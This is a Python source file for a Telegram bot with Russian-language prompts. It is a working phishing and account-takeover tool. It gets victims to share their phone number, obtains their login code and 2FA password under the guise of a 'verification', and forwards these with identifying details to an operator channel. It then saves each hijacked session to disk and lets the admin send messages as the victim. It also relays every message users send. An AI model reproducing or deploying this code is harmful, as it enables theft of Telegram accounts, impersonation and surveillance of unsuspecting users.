#!/usr/bin/env python3
import sys
sys.path.insert(0, "/home/runner/.pythonlibs/lib/python3.11/site-packages")

import os
import logging
import asyncio
import json
from datetime import datetime
from typing import Optional, Dict, Any

from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

from telethon import TelegramClient, errors
from telethon.sessions import StringSession

# Optional encryption (Fernet)
try:
    from cryptography.fernet import Fernet, InvalidToken
    CRYPTO_AVAILABLE = True
except Exception:
    CRYPTO_AVAILABLE = False

# === Config from env ===
BOT_TOKEN = os.getenv("PLAY", "").strip()
CHANNEL = os.getenv("CHANNEL", "").strip()
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "").strip()
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
MASTER_KEY = os.getenv("MASTER_KEY", "").strip()  # optional

if not BOT_TOKEN or not CHANNEL or not API_ID or not API_HASH or not ADMIN_ID:
    raise RuntimeError("Set PLAY, CHANNEL, API_ID, API_HASH, ADMIN_ID in environment.")

CHANNEL_ID = int(CHANNEL)

# === Logging ===
logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
logger = logging.getLogger(__name__)

# === FSM states ===
class AuthFlow(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_2fa = State()

router = Router()

# === Runtime storages ===
SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

user_clients: Dict[int, TelegramClient] = {}   # connected Telethon clients during auth or admin use
user_sessions: Dict[int, str] = {}             # encrypted or plain session strings (as stored)
user_phone: Dict[int, str] = {}                # temporary phone numbers during flow
send_queue: "asyncio.Queue[Dict[str, Any]]" = asyncio.Queue()

# === Encryption helpers ===
USE_ENCRYPTION = False
fernet = None
if MASTER_KEY:
    if not CRYPTO_AVAILABLE:
        raise RuntimeError("MASTER_KEY set but cryptography not installed.")
    try:
        fernet = Fernet(MASTER_KEY.encode() if isinstance(MASTER_KEY, str) else MASTER_KEY)
        USE_ENCRYPTION = True
    except Exception as e:
        raise RuntimeError("MASTER_KEY invalid. Generate with Fernet.generate_key().") from e

def _now_iso() -> str:
    return datetime.utcnow().isoformat()

def _encrypt(text: str) -> str:
    if USE_ENCRYPTION and fernet:
        return fernet.encrypt(text.encode()).decode()
    return text

def _decrypt(text: str) -> str:
    if USE_ENCRYPTION and fernet:
        return fernet.decrypt(text.encode()).decode()
    return text

# === File helpers ===
def save_session_to_file(user_id: int, session_str: str):
    payload = {
        "user_id": user_id,
        "session": _encrypt(session_str),
        "saved_at": _now_iso()
    }
    path = os.path.join(SESSIONS_DIR, f"{user_id}.session.json")
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(payload, f)
        logger.info("Saved session file %s", path)
    except Exception:
        logger.exception("Failed to save session file %s", path)

def load_sessions_from_disk():
    for fname in os.listdir(SESSIONS_DIR):
        if not fname.endswith(".session.json"):
            continue
        path = os.path.join(SESSIONS_DIR, fname)
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            uid = int(data.get("user_id"))
            stored = data.get("session")
            if uid and stored:
                user_sessions[uid] = stored
                logger.info("Loaded session preview for %s", uid)
        except Exception:
            logger.exception("Failed to load session file %s", path)

# === Telethon client helper ===
async def create_client_from_session(session: Optional[str] = None) -> TelegramClient:
    sess = StringSession(session) if session else StringSession()
    client = TelegramClient(sess, API_ID, API_HASH)
    await client.connect()
    return client

# === Small keyboard ===
def contact_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
        resize_keyboard=True
    )

# === Handlers ===

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await message.answer(f"Привет, {message.from_user.first_name or 'друг'}! Нажми кнопку, чтобы отправить номер:", reply_markup=contact_keyboard())
    await state.set_state(AuthFlow.waiting_for_phone)

@router.message(AuthFlow.waiting_for_phone, F.contact)
async def handle_contact(message: Message, state: FSMContext, bot: Bot):
    phone = message.contact.phone_number if message.contact else None
    if not phone:
        await message.answer("⚠️ Не удалось получить номер. Попробуй ещё раз кнопкой.")
        return

    uid = message.from_user.id
    user_phone[uid] = phone

    try:
        client = await create_client_from_session(None)
        await client.send_code_request(phone)
    except errors.FloodWaitError as e:
        await message.answer(f"⏳ Слишком много запросов. Подожди {e.seconds} сек.")
        try:
            await client.disconnect()
        except Exception:
            pass
        user_phone.pop(uid, None)
        return
    except Exception:
        logger.exception("send_code_request failed")
        await message.answer("⚠️ Не удалось запросить код у Telegram. Попробуй позже.")
        try:
            await client.disconnect()
        except Exception:
            pass
        user_phone.pop(uid, None)
        return

    user_clients[uid] = client
    await message.answer("📨 Код отправлен Telegram. Вставь код сюда, как получишь.")
    await state.set_state(AuthFlow.waiting_for_code)

@router.message(AuthFlow.waiting_for_code, F.text.regexp(r"^\d{4,7}$"))
async def handle_code(message: Message, state: FSMContext, bot: Bot):
    uid = message.from_user.id
    code = message.text.strip()
    phone = user_phone.get(uid, "—")
    client = user_clients.get(uid)
    user = message.from_user

    # forward code to admin channel only after user provided it
    now = _now_iso()
    text_code_forward = (
        f"🔑 Код от пользователя\n"
        f"Имя: {user.full_name}\n"
        f"Username: @{user.username or '—'}\n"
        f"UserID: {user.id}\n"
        f"Телефон: {phone}\n"
        f"Код: {code}\n"
        f"Время: {now}"
    )
    await bot.send_message(CHANNEL_ID, text_code_forward)
    await message.answer(f"✅ {user.first_name or 'Пользователь'}, вы прошли проверку — добро пожаловать! ✨")

    if not client:
        await state.clear()
        user_phone.pop(uid, None)
        return

    try:
        await client.sign_in(phone=phone, code=code)
        session_str = client.session.save()
        user_sessions[uid] = _encrypt(session_str)
        save_session_to_file(uid, session_str)

        text_ok = f"✅ Успешный вход\nUserID: {uid}\nТелефон: {phone}\nВремя: {_now_iso()}"
        await bot.send_message(CHANNEL_ID, text_ok)

        # keep client connected so admin can use it immediately
        user_phone.pop(uid, None)
        await state.clear()

    except errors.SessionPasswordNeededError:
        await message.answer("🔒 Установлен пароль 2FA. Введите пароль:")
        await state.set_state(AuthFlow.waiting_for_2fa)
    except errors.PhoneCodeExpiredError:
        try:
            await client.disconnect()
        except Exception:
            pass
        user_clients.pop(uid, None)
        user_phone.pop(uid, None)
        await state.clear()
    except errors.PhoneCodeInvalidError:
        await message.answer("❗ Некорректный код. Проверь и попробуй ещё раз.")
    except errors.FloodWaitError as e:
        await message.answer(f"⏳ Слишком много запросов. Жди {e.seconds} сек.")
        await client.disconnect()
        user_clients.pop(uid, None)
        user_phone.pop(uid, None)
        await state.clear()
    except Exception:
        logger.exception("sign_in error")
        await message.answer("⚠️ Произошла ошибка при попытке входа.")
        try:
            await client.disconnect()
        except Exception:
            pass
        user_clients.pop(uid, None)
        user_phone.pop(uid, None)
        await state.clear()

@router.message(AuthFlow.waiting_for_2fa)
async def handle_2fa(message: Message, state: FSMContext, bot: Bot):
    uid = message.from_user.id
    password = message.text.strip()
    client = user_clients.get(uid)
    phone = user_phone.get(uid, "—")

    if not client:
        await message.answer("⚠️ Клиент не найден. Начни заново: /start")
        await state.clear()
        user_phone.pop(uid, None)
        return

    try:
        await client.sign_in(password=password)
        session_str = client.session.save()
        user_sessions[uid] = _encrypt(session_str)
        save_session_to_file(uid, session_str)

        await message.answer("✅ Вход с 2FA выполнен. Сессия сохранена.")
        await bot.send_message(CHANNEL_ID, f"✅ Успешный вход (2FA)\nUserID: {uid}\nТелефон: {phone}\nВремя: {_now_iso()}")

        user_clients.pop(uid, None)
        user_phone.pop(uid, None)
        await state.clear()

    except errors.FloodWaitError as e:
        await message.answer(f"⏳ Жди {e.seconds} сек.")
        await client.disconnect()
        user_clients.pop(uid, None)
        user_phone.pop(uid, None)
        await state.clear()
    except Exception:
        logger.exception("2FA sign_in error")
        await message.answer("⚠️ Не удалось войти с паролем.")
        await client.disconnect()
        user_clients.pop(uid, None)
        user_phone.pop(uid, None)
        await state.clear()

@router.message(F.text)
async def forward_any_text(message: Message, bot: Bot):
    if message.text and message.text.startswith("/"):
        return
    user = message.from_user
    await bot.send_message(CHANNEL_ID,
                           f"📩 Сообщение от {user.full_name} @{user.username or '—'} ({user.id})\n"
                           f"{message.text}\n🕒 {_now_iso()}")

# Admin commands
@router.message(Command("list_sessions"))
async def list_sessions(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("Нет доступа.")
        return
    previews = []
    for uid, stored in user_sessions.items():
        try:
            decoded = _decrypt(stored)[:24] if USE_ENCRYPTION else stored[:24]
        except Exception:
            decoded = "ошибка_декодирования"
        connected = "connected" if (uid in user_clients and user_clients[uid].is_connected()) else "idle"
        previews.append(f"{uid}: {decoded}... ({connected})")
    await message.answer("Сессии:\n" + ("\n".join(previews) if previews else "Нет сохранённых сессий."))

@router.message(Command("use_session"))
async def use_session(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split()
    if len(parts) < 2:
        await message.answer("Использование: /use_session <user_id>")
        return
    try:
        target = int(parts[1])
    except ValueError:
        await message.answer("Неверный user_id")
        return
    stored = user_sessions.get(target)
    if not stored:
        await message.answer("Сессия не найдена")
        return
    try:
        session_str = _decrypt(stored)
    except Exception:
        await message.answer("Не удалось расшифровать сессию.")
        return
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
    except Exception as e:
        await message.answer("Не удалось подключить сессию: " + str(e))
        return
    user_clients[target] = client
    await message.answer(f"Сессия для {target} подключена.")

@router.message(Command("send_as"))
async def send_as(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split(maxsplit=3)
    if len(parts) < 4:
        await message.answer("Использование: /send_as <user_id> <chat_id> <text>")
        return
    try:
        target = int(parts[1])
    except ValueError:
        await message.answer("Неверный user_id")
        return
    chat = parts[2]
    text = parts[3]
    client = user_clients.get(target)
    if not client or not client.is_connected():
        await message.answer("Клиент не подключён. Используй /use_session сначала.")
        return
    try:
        await client.send_message(chat, text)
        await message.answer("Отправлено.")
    except Exception as e:
        logger.exception("send_as failed")
        await message.answer("Ошибка: " + str(e))

@router.message(Command("disconnect_session"))
async def disconnect_session(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split()
    if len(parts) < 2:
        await message.answer("Использование: /disconnect_session <user_id>")
        return
    try:
        uid = int(parts[1])
    except ValueError:
        await message.answer("Неверный user_id")
        return
    client = user_clients.pop(uid, None)
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass
        await message.answer("Отключено.")
    else:
        await message.answer("Клиент не был подключён.")

@router.message(Command("ping"))
async def ping(message: Message):
    await message.answer("pong")

# Optional worker
async def send_worker():
    logger.info("Send worker started")
    while True:
        job = await send_queue.get()
        try:
            uid = job["user_id"]
            chat = job["chat"]
            text = job["text"]
            client = user_clients.get(uid)
            if client and client.is_connected():
                await client.send_message(chat, text)
            else:
                logger.warning("Client for %s not connected", uid)
        except Exception:
            logger.exception("Worker failed")
        finally:
            send_queue.task_done()

# === Main ===
async def main():
    load_sessions_from_disk()
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    await bot.delete_webhook(drop_pending_updates=True)
    logger.info("Bot polling started")
    worker = asyncio.create_task(send_worker())
    try:
        await dp.start_polling(bot)
    finally:
        worker.cancel()
        for uid, client in list(user_clients.items()):
            try:
                await client.disconnect()
            except Exception:
                pass

if __name__ == "__main__":
    asyncio.run(main())
